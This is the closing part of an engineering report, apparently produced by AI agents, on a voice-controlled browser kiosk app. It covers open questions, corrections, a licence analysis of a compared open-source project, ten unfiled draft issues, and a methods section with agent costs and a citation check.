The clause on Commands that ended not done also undercounts: an Errand ending in failure logs `done` (turn-mvqi2ulz-v5, turn-mvsihi98-v17, `findings/reuse.md`).

### Contradictions left open

Numbered as in `report/candidates.md` section 3.

| # | what is open | what would settle it |
|---|---|---|
| 1, remainder | What ended the hold at 22:05:38. T8 infers a relaunch from file boundaries; the logs do not prove it. Whether a no-commit `back` (a 204, a download, an aborted load) leaves the hole in practice is by reading only. The value of `HISTORY_STEP_TIMEOUT_MS` was not opened, so "fits a 15 s wait" stays an inference | A reproduced no-commit step |
| 2 | Signed in or out | You |
| 3 | The rule for a Planner `navigate`. `file:` goes in as hard policy, now backed by T9's guard path. Between treating one that carries text as `leaves`, http(s) with a host check, and measuring first: a tie | A measure grown to reach it. `goal:gate` is on your word |
| 4 | `control_effect` with no sure reading: no reading adds nothing (`decisions`), or `unclear` confirms (`safety`). `goal:gate` declines every confirm, so it cannot weigh this | Labelled real controls; a tie |
| 9, remainder | `planner-step` 2.7 s against 3.5 s p50. 6 asks of 189 are carried by no record field and were not traced. No rank depends on either | A trace |

### Corrections to the findings

Each finding stays as written. Read these beside them.

| finding | says | correct |
|---|---|---|
| `traps` | Spoken volume lines during the hold | The records say typed |
| `electron-browser` H3 | A debugger command that never answered | Superseded. The action is the typed `go back`, turn-mvocktqm-a |
| `context`, and C4 in `candidates.md` | `Go back to highs and lows.` read as `back` and capped; the name would help | Corrected by T3: it ended done on the right page, and the song named was the one playing |
| `quality`, `reuse` | Jev p50 584 ms | That mixes models: Jev 264 ms, Mammoth 1,192 ms |

### Hypotheses unrun

T2's and T3's single cases are no baseline. T5 and T7 did not test what they set out to: T5 found no case, T7 could not run. T9 ran the guard path on a fake browser only. The lists below sit in each finding's "Hypotheses to test".

| finding | unrun |
|---|---|
| `safety` | H1–H7, including H5: whether a `file:` load works and whether its text reaches the Planner's memory |
| `agent-loop` | H1–H6, including H4, the fragment class, of which T1 asked one line |
| `perception` | 1–11 |
| `decisions` | 1–7 |
| `traps`, `electron-browser` | Their lists. `electron-browser` H1, capture outside Chromium, is C2 and untested |

### Read but not run, or not re-opened

- **Doc-only and †platform facts:** the "Unverified" section of `findings/electron-browser.md`. Section 3 marks them.
- **WebBrain's Jev speedup is unverified by their own statement:** the fast flow "is not a verified speedup until the paired live evaluation passes" (`repo:test/jev/README.md:L3-L5`).
- **`unsettledAction.ts:L249`,** which `candidates.md` cites, was not re-opened. This report uses `ours:src/core/browser/unsettledAction.ts:L166` only.
- **Whether the Turing line's first hop came from a cut:** that card is not in the logs (`findings/perception.md`).
- **The kiosk logs** come from its installed build, not necessarily the pin (`kiosk-snapshot.txt` names the AppImage, not a commit), so a logged line may predate a fix at the pin.
- **Citations outside the top 10 and the safety block** are carried from the findings as written, not re-opened.

**`AGENTS.md` disagrees with your ruling on the gate.** Its widening section calls `BINGBONG_GATE_MODELS` "the free, deterministic ones" and says measuring runs on the free models (`ours:AGENTS.md:L39-L41`). Your ruling of 2026-10-28 moved every measure to Jev once the Baseten free week ended, and the root `.env` names no gate model (checked 2026-10-31). This report follows the ruling for what a gate costs and leaves `AGENTS.md` untouched. The line is yours to change or keep.

## 7. Licence

Your brief assumed "MIT attribution". That is not the position. Not legal advice; read from files in the pinned tree and its history.

| what | licence | evidence |
|---|---|---|
| WebBrain 33.0.0 and later (root, `src/chrome`, `src/firefox`, `scripts/`, `test/`) | GPL-3.0-or-later | `repo:LICENSE:L1-L8`, `repo:package.json:L144-L144` |
| WebBrain before 33.0.0 | MIT | `repo:CHANGELOG.md:L2449-L2449` |
| `mcp-server` | MIT | `repo:mcp-server/package.json:L12-L12`, `repo:mcp-server/LICENSE:L1-L3` |
| `lmstudio-plugin` | MIT. `htmlToText.ts` and `fetchUrl.ts` say "Ported from" a file that is GPL today; the port (2026-05-04) predates the relicence (2026-08-20) | `repo:lmstudio-plugin/package.json:L8-L8`, `repo:lmstudio-plugin/src/util/htmlToText.ts:L1-L5` |
| `firefox-companion` | GPL by the root licence: it has no licence file or `package.json` of its own (checked) | `ls firefox-companion` |
| `webbrain-systray` | GPL-3.0-or-later, its own notice | `repo:webbrain-systray/LICENSE:L1-L10` |
| Vendored autoconsent | MPL-2.0. Not proposed | `repo:src/chrome/src/agent/cookie-banner-host.js:L1-L41` |

**The clean MIT commit is `df3176e45d07ae78f9e3a46c3c69012c91cb09fb`** (2026-08-20 12:39:23 +0300; re-checked here: `LICENSE` MIT, `package.json` MIT, 0 paths matching `libzim`). It is the first parent of the merge `abe2e47c7` that brought the GPL in.

**Why not `2a0e7011b`, the merge's other parent and the commit that looks like the last MIT one.** Its root `LICENSE` and `package.json` are still MIT, but its tree already holds `src/chrome/vendor/libzim/` (the GPL Xapian/libzim Wasm, 26 paths match here), and its `src/chrome/LICENSE` is already a release-package notice conveying the extension as a GPL combined work (`findings/traps.md`). Sixteen later MIT-labelled commits exist off the line, PR branches cut before the switch and merged after it; they are no better a pin. The MIT tag `v32.2.3` holds the same 27 payloads and 20 security scenarios, if the literal strings are ever wanted (`findings/quality.md`).

**Our repo.** No `LICENSE` or `COPYING` file at the root of `ours` at `7597c6cf`, and no `license` field in `package.json` (both checked). It is unlicensed by default, which is fine for one owner with no release. It means nothing in the repo tells a future reader what any added third-party file's terms sit beside.

**What this means here.**
- Every recommendation in this report is the idea only, reimplemented. **Nothing needs attribution today.**
- Copying code from the pin would bring GPL obligations on distribution. Private use on your own kiosk conveys nothing (`repo:LICENSE:L175-L176`, §2), but GPL files in the tree would matter on any handover or release.
- Do not copy their question wording either: `control_effect`'s text, `terminal-messages.js`'s table and the corpus strings at the pin are GPL. Write our own.


## 8. Draft issues for the top 10

**Not filed.** Each is ready for your approval: title, label, and body in `docs/agents/issue-tracker.md`'s form. GitLab assigns the number; `open-issues.txt` shows the tracker past #551.

**No draft carries `Blocked by:`.** Each was checked against `open-issues.txt` (read 2026-10-31); none has a genuine blocker, and capture order is no dependency.

**Before filing any of them:** run `pnpm bugs`, add the lines the draft names with `pnpm bugs:add`, then set `claimedBy` on each once the number exists (`docs/agents/bugs.md`). Every stage below is a proposal, to be checked against the record. The ledger facts were read in `ours/fixtures/failed-lines/` at the pin on 2026-10-31.

| draft | id | yield claim | needs your word |
|---|---|---|---|
| 1 | C1 | yes, `overlap` 20 | **Yes** for any gate run, which is on Jev today |
| 2 | C2 | yes, `overlap` 20 | **Yes**: `overlap:gate --with-jev`, `stt:gate`, a spoken session |
| 3 | C5 | yes, `question` 10 | **Yes** for any gate run, and for the positive case if it takes a live run |
| 4 | C6 | yes, `open` 10 | **Yes** for any gate run, and for a rerun if the ask is no longer logged |
| 5 | C7 | yes, `open` 10 | No |
| 6 | C8 | yes, `read` 10 | **Yes** for any gate run, and for a live page if no stored one serves |
| 7 | C9 | yes, `goal` 4 | **Yes**: `goal:gate` (Planner calls) and its `jev:gate` case |
| 8 | C3 | **no** | **Yes** for any gate run |
| 9 | C10 | **no** | No |
| 10 | C11 | **no** | **Yes**: kiosk env, a live change, a day with a fallback armed |

**No gate is free today.** `AGENTS.md` describes free gate models under `BINGBONG_GATE_MODELS`, but your ruling of 2026-10-28 ended them: the root `.env` names no gate model and no Baseten key (checked 2026-10-31), so a gate run asks Jev, frugally: only the cases whose card changed. Section 6 lists the stale line. `pnpm jev:overlap` builds and rebuilds cases: its script head and a grep show no model call; `jev:gate` is what asks.

### Draft 1, C1

**Title:** A fragment finishing the line before is read as `goes_on`, so it runs as its own line: ask the Fate so that a fragment can read `joins`, grown from the real lines first

**Label:** `needs-triage`

```markdown
**Scenario:** `overlap`.
**Place:** yield 20 (~10 × 2, count the owner's, 2026-10-27). Nothing above it; tied with `play` and `control`.
**State:** `partly`. 17/26 on the shipped road, `pnpm overlap:gate --with-jev --road audio`, 2026-10-29. How it breaks: 5 of 20 kiosk Fates (10-28 to 10-30) look wrong and are one class, a short fragment finishing the line before. That is one reader's judgement with no ground truth, and it is evidence of how, not how much.
Measured 2026-10-31, `Nicki Minaj.` after `Play New Body by Drake.` (turn-mvtmtyol-vh), 3 asks on jev-1.14.0: `goes_on` top 3 of 3 at 0.39-0.44, `joins` 0.27-0.31, overall conf 0.19-0.25, `ends` 0.24-0.30. The kiosk's read agrees. It played "Nicki Minaj" at 11.5 s and the whole line was said again.
**Change:** stays `partly`. Removes the "add to it, correct it" fragment share. None of the 26 Sequence Cases reaches this today.

**Lines.** Add, then claim:
- turn-mvtmtyol-vh, `Nicki Minaj.`
- turn-mvsifc3b-v10, `Bum, Kanye West.`
- turn-mvsifm0v-v12, `P-O-M-M-E, Kanye West.`
- turn-mvtpj6r7-v1l, `To the top.`
Proposed stage `reading`. The spelled lines also carry an ear problem, so check whether `stt` failed first.
Not claimed: turn-mvsihjew-v18 (`L-O-O-P.`), the fifth of the class, is claimedBy #500 with no `fixedBy`, and #500 is not among the open issues. It wants its own look.

**What to change, by kind.** How the Fate is asked: `fateQuestion` and `runningLines` (`ours:src/core/command/runningCommand.ts:L91-L112`). Unsure goes on (`ours:src/core/command/applianceCard.ts:L317-L319`), and no label is near the 0.7 bar. The fork is near-even among three labels, and that is what the card has to move. No word list and no per-artist rule: the widening holds for every running line. Arms are named after the cases exist.

**Measure, named before building.** Grow the cases from the four lines first, then run `pnpm jev:gate`; a case is through only when every gate model passes it, and nothing that passed may be lost. `jev:case <turn> --expect fate=joins --appliance` refuses at the pin (`no question "fate"`), because the companion builder makes no running lines. `jev:case turn-mvtmtyol-vh-appliance --expect fate=joins` works from the logged Appliance ask. After a wording change, `pnpm jev:overlap rebuild`. The counter-case to keep: a remark or an aside really should go on. `--with-jev` only on the owner's word.

**Felt Reaction.** No stage added; the same ask. Instant or Quick by the line. Before and after the same apart from the wording.
```

### Draft 2, C2

**Title:** The person over the app's voice is lost in Chromium's canceller: measure mic capture and canceller outside Chromium as a second route to rows 10, no fork

**Label:** `needs-triage`

```markdown
**Needs the owner's word:** `overlap:gate --with-jev`, `stt:gate` (the real socket) and a spoken session.

**Scenario:** `overlap`.
**Place:** yield 20 (~10 × 2, the owner's count). Nothing above it; tied with `play` and `control`.
**State:** `partly`. 17/26, `pnpm overlap:gate --with-jev --road audio`, 2026-10-29. 2 of the 9 reds are this: `10-move-on-while-speaking`, `10-stop-while-speaking`.
**Change:** stays `partly`, 17/26 to 19/26 at best. That the route works at all is untested. No state is claimed until the gate says so.

**Overlap.** #490 and #512 are open on the same reds; this is a second route to them, not a replacement, and neither blocks it. #490 tells the person from the app's voice in the ear; #512 records the canceller removing the person with the app's voice played through Chromium (0 speech starts in 63 s on the kiosk).

**Lines.** Claims none. The 12 lines claimed by #490 (3 of them fixed) and turn-mvtlb2tn-v3, claimed by #512, stay where they are.

**What to change, by kind.** Capture today is `echoCancellation: true` in a renderer (`ours:src/renderer/src/micCapture.ts:L28-L32`). Move the mic and the canceller to a native process with the app's own output as the reference. First a spike that shows whether the person survives; no Chromium fork. The route changes capture only, not the ear's downstream road.

**Measure, named before building.** `pnpm overlap:gate` rows 10 (`10-move-on-while-speaking`, `10-stop-while-speaking`), then `fixtures/echo-replay` and `fixtures/own-voice` through `pnpm stt:gate` where they reach it, against the same run's other cases. Stop if the spike leaves the person out. On the kiosk, where #512 measured the loss.

**Felt Reaction.** Tier Task for the measure; the promise at stake is Instant, the stop. Before and after unmeasured. Adds a process boundary for capture only, so its latency has to appear on a perf span before any verdict.
```

### Draft 3, C5

**Title:** A sure done with no passage on a question ends with nothing said: say what was asked, by a closed read if a positive case holds, never on every done

**Label:** `needs-triage`

```markdown
**Needs the owner's word** for the positive case, if it takes a live run: a CLI rerun asks whichever host the root `.env` names. The gate runs on Jev today, so it needs your word too.

**Scenario:** `question`.
**Place:** yield 10 (~5 × 2). Below `overlap`, `play`, `control` at 20.
**State:** `partly`. Rerun 2026-10-24 on main 20f843b5, Mammoth, 7 of 8 said. The row's one still-breaking line: `show me the BBC weather forecast for London` ends done with nothing said, passage none 0.64 (turn-mvm63gpl-l, as turn-mvl575cq-3, both typed).
Checked 2026-10-31 on the kiosk logs: 7 spoken dones with no TTS span, none of them owing words (`No.`, `Go back to highs and lows.`, `Look up the Great Wall of China on DuckDuckGo.`, `Go to thariq.io…`, `Click on the first link.`, `To the top.`, `Song.`). So the break is shown on typed lines only. Those two typed lines are not in the kiosk logs, so no case was made from them.
**Change:** stays `partly`: `how do i install it`'s Copy click on the Verdict hop remains. Removes that break, so 8 of 8 said on that set.

**Overlap.** Adjacent to #415 (a sure passage under a pop-up, never said when the Task ends wall), a different end. Neither blocks the other.

**Lines.** Claim turn-mvl575cq-3 (ledger, stage `reading`, unclaimed). Add and claim turn-mvm63gpl-l.

**What to change, by kind.** Two arms.
- A: a fixed line from facts already held (`pageName`, `ours:src/core/command/answer.ts:L232-L236`) on every sure done with no passage. Would have added speech to all 7 silent spoken dones above.
- B: a closed read beside the Verdict, `told` or `shown`, beside the passage question (`ours:src/core/command/jevReading.ts:L1525-L1534`). Measured on one negative only: `shown` 1.00 twice on `turn-mvtpi45m-7`, with the Verdict and passage unmoved.
B is the safer arm. The fork needs a positive case first: whether B says `told` on an owed line is unknown.

**Measure, named before building.** `pnpm jev:gate`, with a positive case from a real ask of the BBC line (rerun if its ask is gone) and negatives from the 7 lines. A line that owes nothing and starts speaking is a loss.

**Felt Reaction.** Tier Task. Arm A adds no stage. Arm B adds a question on the same call, no new call; its time on the ask to be read on `pnpm perf:report`. Adds a sentence spoken: check `docs/agents/ui.md` and the input-to-output chart.
```

### Draft 4, C6

**Title:** An empty landing can read as done: put the classifier's fact on the Verdict's card, and try a higher bar on `yes` as the second arm

**Label:** `needs-triage`

```markdown
**Needs the owner's word** only for a rerun, if the ask for this line is no longer logged; the gate runs on Jev today, so it needs your word too.

**Scenario:** `open`.
**Place:** yield 10 (~5 × 2). Below `overlap`, `play`, `control` at 20.
**State:** `partly`. Rerun 2026-10-24 on main 20f843b5, 4 of 7 right. `open voicestudio` navigates at 0.58 to an empty voicestudio.com and reads yes 0.75 and 0.76, done (cli-5-mvm5vjrc, typed, Mammoth).
**Untested on the kiosk:** on 2026-10-31 the pinned `classifyEmptyLanding` over all 136 logged Verdict asks classed 0 as empty. Result text is not logged, so each outcome was rebuilt from its state. 0 Jev asks; no case came from it.
**Change:** stays `partly` (the mishear remains, and two breaks under `wall`). Removes one of the row's non-wall breaks. This issue stops the false done only. The ledger's `meant` also asks that no `.com` be guessed, and that remains, so closing here marks the line `ruled` or leaves that half to another fix.

**Lines.** One-off: claims cli-5-mvm5vjrc alone (ledger, stage `reading`, unclaimed). Look at the stage's other open lines in `pnpm bugs` for the wider net first.

**What to change, by kind.** Jev never sees the classifier's result at the Verdict. Arm A: carry the fact on the card. Arm B: a higher bar on `yes`. Which goes first is unanswered: B alone is a threshold with no fact behind it, and may send other sure dones the wrong way. Every empty page of the kind, never a site.

**Measure, named before building.** `pnpm jev:gate`, with a case from cli-5-mvm5vjrc. The ledger line's log is `decision-1792831931914-1.jsonl`, from the dev machine; if the ask has rolled away, the case takes a rerun. Add a real page that is short but not empty as the counter-case. With no kiosk case the corpus is thin, so a tie goes to the arm cheapest to reverse.

**Felt Reaction.** Tier Task. No stage; a card fact on an existing ask.
```

### Draft 5, C7

**Title:** A refused ref says "That number isn't one I can use here" when no number was said: say a plain line about the page moving

**Label:** `needs-triage`

```markdown
**Scenario:** `open`; also `read` and `search`.
**Place:** yield 10 (~5 × 2). Below `overlap`, `play`, `control` at 20.
**State:** `partly`. Logged 2026-10-28 UTC on the kiosk, Mammoth: spoken `Click on the first link.` (turn-mvsfgjo9-vh). Hop 1 (turn-mvsfglol-3) picks `Continue with phone`; it is refused, `ref 1 refused: it no longer names the element you were shown`, and the Task ends wall. By reading `failureLineOf`, that says the number line (`ours:src/core/command/spokenFailure.ts:L70-L71`, `ours:src/core/command/spokenFailure.ts:L92-L94`, reached at `ours:src/main/run/commandRunner.ts:L2300-L2319`). TTS text is not logged, so what was said is by reading. The owner said no number.
**Change:** no state moves. The wrong sentence goes.

**Out of scope, on the evidence.** Going on after a refusal. On 2026-10-31 the re-read's card proved equal to the refused card and Jev picked `click-1` again at 0.92, 0.94, a phone sign-up, so going on has no support from this line. The wall itself stays (`ours:src/main/run/commandRunner.ts:L2627-L2632`). `turn-mvsfg84d-2` of turn-mvsfg0oe-ve has `the text block is no longer on the page`, which does not reach this line and gets the general failure line, so it is not claimed. No remap: ADR 0033.

**Lines.** One-off: adds and claims turn-mvsfgjo9-vh alone (proposed stage `reading`; the refusal is the runner's reaction, so check). One spoken line stands behind it. Look at the stage's other open lines first.

**What to change, by kind.** `REFUSED_REF_LINE`: on any refused ref, a plain sentence saying the page moved. Keep the wording to what the refusal proves. A line the person spoke with a number may still deserve the number; if so, that is the only fork to name.

**Measure.** The unit suite on `failureLineOf`, `pnpm test`. `pnpm jev:gate` is not needed: no card changes.

**Felt Reaction.** Failure path only, no stage. Changes a sentence spoken: check `docs/agents/ui.md` and the input-to-output chart.
```

### Draft 6, C8

**Title:** When the Card Budget cuts a long page, what stays is only the nearest to the view: hand room first to blocks sharing a word with the line, and say the cut on the card

**Label:** `needs-triage`

```markdown
**Needs the owner's word** for a live page, if no stored page serves; the gate runs on Jev today, so it needs your word too.

**Scenario:** `read`.
**Place:** yield 10 (~5 × 2). Below `overlap`, `play`, `control` at 20. The row is stale in part: its grammar `read` road was removed by a1343fef, 2026-10-30.
**State:** `partly`. Rerun 2026-10-24 on main 20f843b5, Mammoth: `show me the part about his death` takes 3 calls, `Toggle the table of contents` at 0.51 first (cli-32-mvm65npd, typed). 11 kiosk asks were cut, all Wikipedia, each losing 70 to 99 further-down options.
**Untested.** On 2026-10-31 this could not be run: the named line `Do it.` has no content word, the cut blocks are not logged, and none of the 11 lines asks about a section. **Not confirmed that the cut caused that hop:** that card is not in the logs.
**Change:** stays `partly`; toward one hop on long pages, if the cut is the cause.

**Lines.** Claims none. cli-32-mvm65npd is not on the ledger and ended done. Add it only once a card shows the cut caused its hop.

**What to change, by kind.** The `nearest` step at `ours:src/core/command/jevReading.ts:L1371-L1385` (`ours:src/core/command/jevReading.ts:L949-L951`): room first to blocks sharing a content word with the line, then headings, then nearest first. Still shown in page order. No site in the rule: Jev keeps the choice. The card says that blocks were cut (today only the ask's record does).

**Measure, named before building.** Log the cut blocks first, or T7's gap stays. Then `pnpm jev:gate` with cases grown from `turn-mvtn5d45-vt`, `turn-mvtn3g95-2`, `turn-mvtouzek-3`, and one section-asking line on a stored long page. `jev:case` needs an ask with its cut blocks, and that does not exist yet.

**Felt Reaction.** Tier Task (a question) or Instant (scroll). No stage and no ask added; before and after the same up to a sort in card building.
```

### Draft 7, C9

**Title:** "Save the thumbnail" never finishes because the watch page draws no image: offer the page's declared image as a Capture Op, by kind

**Label:** `needs-triage`

```markdown
**Needs the owner's word** for `goal:gate` (Planner calls). The `jev:gate` case runs on Jev today and needs your word too.

**Scenario:** `goal`.
**Place:** yield 4 (~2 × 2, a guess, 2026-10-26). Below every row at 5 and up.
**State:** `partly`. `pnpm goal:gate`, 2026-10-27 on main 0829e79f + #468, Mammoth deciding, Planner glm-5.3-flash: 19/60 over `--repeat 3`. `goal-13` never done: the watch page draws no image of the video, so no capture on the card is the thumbnail, and capturing the page is a wrong save (`ours:fixtures/jev-cases/cli-3-mvph9ink.json:L264`).
**Change:** stays `partly`. One of 20 cases, at most +3 on 19/60. Not measured. `goal-14`, a shot of a chart, is not reached.

**Lines.** One-off: adds and claims the `goal-13` line, stage `goal` per `docs/agents/bugs.md`. cli-3-mvph9ink is a corpus case and not on the ledger; if its logs are gone, a `pm-<date>-<n>` id by hand.

**What to change, by kind.** Capture Ops carry link, image, text and page (`ours:src/core/command/captureOp.ts:L4-L12`). `og:image` is read for News alone (`ours:src/core/news/storyImage.ts:L293-L296`). Offer what a page's head declares as an image, on every page that declares one. Jev picks it; no site and no download path.

**Measure, named before building.** Case cli-3-mvph9ink in `pnpm jev:gate`, with `CAPTURE_PAGE_LINE`'s lost-case history as the regression to watch (`Copy the link to this video`). Then `pnpm goal:gate` goal-13, on the owner's word.

**Felt Reaction.** No stage on the Command path; a card line only.
```

### Draft 8, C3

**Title:** A misheard `play` searches the mishearing even when the song has played here before: try names already played on the card as a gate arm, no yield claim

**Label:** `needs-triage`

```markdown
**Not a yield claim.** It cannot be stated with a Place: the one case that could have supported it did not. Filed so that the measure exists. Touches `play` (20, ~10 × 2, `partly`, names misheard).

**State.** `Play Tum See Tum Tuck by Neon` (turn-mvp8igvj-v2), 3 asks on jev-1.14.0, 2026-10-31: base `s1-6` 0.94; arm with played names as slot options, `s1-6` 0.93, 0.94, names 0.00 each. One case, one wording, one arm shape: it does not refute the idea. Of 53 searched picks, at most 13 repeat a video already found; `tum se tum tak` took five spoken forms. Only names already played could ever settle.
**Change:** none claimed. If an arm passes, `play` stays `partly` with a new name unchanged.

**Overlap.** #469, the ElevenLabs ear trial, holds the row's open mishear lines. A better ear may remove this, so read its result first. Not a blocker.

**Lines.** Claims none. turn-mvp8igvj-v2 is claimed by #456 and fixed (6a6f35a1). turn-mvi5bacg-7 and turn-mvjue289-g are #469's.

**What to change, by kind.** Arms: none, and the most recent N played names. Jev generates nothing, so a list on the state alone cannot change a pick; the shape tried was slot options. Other shapes are unmeasured.

**Measure, named before building.** `pnpm jev:gate` with cases grown from the logged forms (19 spoken `tum se tum tak` records, 16 distinct transcripts) and lure cases, since T2 had no competing line. A measured tie goes to today's card. `--with-jev` only on the owner's word.

**Felt Reaction.** No stage. Competes for room on Instant's card, so the smallest-card rule applies: check on `pnpm perf:report`.
```

### Draft 9, C10

**Title:** A `back` that commits nothing holds the browser with no stopped arm, and a read withheld in a hold answers `none`: add the arm, say the hold, and measure a bound

**Label:** `needs-triage`

```markdown
**Not a yield claim.** Touches `control` and `overlap`. The case that happened is fixed at the pin (5403389f, 2026-10-25); the rest is by reading, with no logged case.

**State.** 2026-10-25: the typed `go back` (turn-mvocktqm-a) failed "stopped waiting for the page to go back", and 1,745 refusals followed over 29 minutes (1,741 `music.player.evaluate`, 4 `collectPage`), the 4 being the 4 lines read `none`. What ended it is not settled; a relaunch is inferred from file boundaries.
Remaining, by reading: `historyStep` waits for `did-navigate` or an in-page step (`ours:src/main/browser/paneNavigation.ts:L279-L292`). A 204, a download or an aborted load has neither and has no stopped arm, though `commitOrStop` does (`ours:src/main/browser/paneNavigation.ts:L245-L256`). Custody releases only on settlement (`ours:src/core/browser/unsettledAction.ts:L216-L223`); `stop` passes it (`ours:src/core/browser/unsettledAction.ts:L166`); the Player waits it out (`ours:src/main/music/player.ts:L641-L647`).
**Change:** no state on a normal day. Reproducing a no-commit step is the first job: if it cannot be reproduced, this closes as `ruled` or `wontfix`.

**Lines.** Adds turn-mvocktqm-a with `--fixed 5403389f` (proposed stage `runner`), for the record. Claims nothing open.

**What to change, by kind.** Three parts:
1. The stopped arm on `historyStep`.
2. A withheld read answered with a spoken line, not a blank card read `none`.
3. A bound on custody. Its length is a tie, and ADR 0038 changes with it.
Effort: S for 1 and 2, M for the bound.

**Measure, named before building.** The unit and e2e suites on a no-commit step. For the bound, a perf span on holds; a guessed number is marked so in the code.

**Felt Reaction.** No stage. An Instant line during a hold goes from refused to answered. Changes a sentence spoken: check `docs/agents/ui.md` and the input-to-output chart.
```

### Draft 10, C11

**Title:** A hung decision host on the kiosk costs 3.0 s and then nothing: arm a fallback host with its timeout at 750 ms

**Label:** `needs-triage`

```markdown
**Needs the owner's word:** kiosk env, a live change, and a day with a fallback armed.

**Not a yield claim.** Touches `control` and `overlap`. 0 host failures since Jev on 2026-10-28, in 183 reads (kiosk logs, 2026-10-31): no change on a normal day.

**State.** The kiosk has no fallback: `findings/providers.md` reads the kiosk as not using one; `resolveDecisionRouting` gives `fallbacks []` on the measure clone's `.env`. Attempts with a host after them take 2,250 ms, measured on Mammoth (`ours:src/core/decision/decisionRouting.ts:L62-L69`); the last attempt takes `BINGBONG_DECISION_TIMEOUT_MS`, 3,000 ms on the kiosk (`ours:src/main/decision/createDecisionModel.ts:L112-L113`). Jev's p95 is 520 ms, max 599 ms, n=146.
**Change:** none on a normal day. Removes a failure class that returns on any outage. Proposed scenario `host-down`, no count.

**Overlap.** #439: the 750 ms number wants the span that #439 owes; the env itself does not wait. Not a blocker. Reliability rule 3 (an Instant line fires when every host fails) is C12, separate.

**Lines.** Claims none. No logged failure since the switch.

**What to change.** Env only, no code: a fallback host in the chain, and `BINGBONG_DECISION_FALLBACK_TIMEOUT_MS=750`. By #477's own method, p95 rounded up to the next 250 ms, Jev live gives 750. Keep 3,000 ms on the last attempt only if that host needs it (Mammoth's page-card max is 2,943 ms).

**Measure, named before building.** `pnpm perf:report` first-attempt spans.

**Felt Reaction.** Tier Instant, Appliance Card. Healthy host: unchanged. Hung host: today 3.0 s then nothing (n=1). With the fallback at 750 ms: about 1.4 s, 0.75 s plus Mammoth's appliance p95 of 622 ms, or 3.75 s if both hang. At the default 2,250 ms: 2.25 s plus the answer, or 5.25 s if both hang.
```


## 9. How this was done

**Setup.** Parallel agents on `claude-opus-5-5`, each reading both pinned trees read-only and the 10-day kiosk log copy, one finding file per subsystem. A synthesis agent merged them into `report/candidates.md`, a measure agent tested its claims in a scratch clone (`measure/`), and writers produced this report. Nothing in `ours` changed and nothing was filed.

**Jev and Planner use.** 13 Jev asks of the 24 cap, all `jev-1.14.0`; the ledger `measure/tmp-corpus/ledger.jsonl` has 13 lines (counted 2026-10-31). 0 Planner calls, no other paid host, no gate, no suite, no app launch. Scratch is left uncommitted in `measure/`.

**Agents, from `report/runs.tsv`.**

**Final costs, all 23 runs at list price:** $81.63, 183 agent-minutes summed, about an hour of wall time (19:43 to 20:45). Add about $0.45 for the tool probes before launch, which are not in this list. Runs after this table was drafted: writer $3.68, w-a $2.53, w-b $2.23, w-c $4.20, verify $1.52.

The table and totals below cover the first 18 runs; the line above carries the final total.

| agent | what it did | cost, $ | minutes | stopped at the context guard |
|---|---|---|---|---|
| actions | subsystem finding | 4.38 | 9 | **yes**; its file was finished |
| agent-loop | subsystem finding | 3.81 | 9 | |
| context | subsystem finding | 3.44 | 8 | |
| decisions | subsystem finding | 4.68 | 11 | **yes**; its file was finished |
| electron-browser | subsystem finding | 3.45 | 9 | |
| firefox-diff | subsystem finding | 2.38 | 6 | |
| integrations | subsystem finding | 3.11 | 7 | |
| perception | subsystem finding | 4.59 | 11 | **yes**; its file was finished |
| providers | subsystem finding | 3.55 | 9 | |
| providers, second run | a resume | 4.07 | 1 | |
| quality | subsystem finding | 3.58 | 8 | |
| reuse | subsystem finding | 3.45 | 8 | |
| safety | subsystem finding | 3.24 | 8 | |
| traps | subsystem finding | 3.92 | 13 | |
| ux | subsystem finding | 3.57 | 9 | |
| walls-media | subsystem finding | 3.99 | 9 | |
| synthesis | `report/candidates.md` | 3.59 | 6 | **yes**, at 308k; its file was finished |
| measure | `findings/measurements.md`, T1–T9 | 4.65 | 13 | |
| **18 rows** | | **67.45** | **154** | |

The minutes are summed; the agents ran in parallel, so 154 is not wall time.

**The writer also stopped at the guard,** at 318k tokens, with parts 0, 3 and 7 saved. It had no row in `runs.tsv` when this was written. Its handoff (`handoffs/writer/HANDOFF.md`) let the rest continue in parallel writers (`w-a`, `w-b`, `w-c` in `logs/agents.tsv`).

**What was checked, and what was not.**
- The citations behind the top 10 and the safety block were re-opened at the pinned trees. The first writer re-opened them all (listed in its handoff). The continuing writer re-opened about two dozen of them on 2026-10-31, and they held.
- The C7 narrowing was re-checked against `kiosk-logs` and holds: of the two lines cited, only turn-mvsfglol-3's error matches `failureLineOf`'s number line.
- Twelve ledger facts were re-checked against `ours/fixtures/failed-lines/` and hold. That check also found what the handoff had not recorded: turn-mvp8igvj-v2 is fixed (#456), and three `yield.md` citations are out of date against the ledger (section 6).
- All other citations are carried from the findings, not re-opened. The citation sample is the orchestrator's.
- Measured means run, as `findings/measurements.md` records it. Everything else is reading.

**Verification.**

**Independent citation check, 2026-10-31.** A script drew 15 of the 413 unique citations at random (seed 20261031, `tools/sample.py`). A fresh opus agent that saw only those citations and the text around them, and read neither findings nor report, checked them at the pinned trees, whose HEADs it confirmed. **Result: 9 correct, 6 partly, 0 wrong, 0 uncheckable.** The six: two had a claim too broad for the lines (Firefox re-injection, "asks on every dismissal"), two had lines covering part of the claim (bridge pairing and approval, tier pinning), two reached the right conclusion with a short range (`stands`, the fallback chain's signal). All six are corrected above. None sits behind a top 10 row. **Read that as a rate:** 40 % of a small sample were imprecise and none false, so expect some of the other 398 to have ranges or wording looser than they look. Open the lines before building on one. Only the citations behind the top 10 and the safety block were also re-opened by a writer.

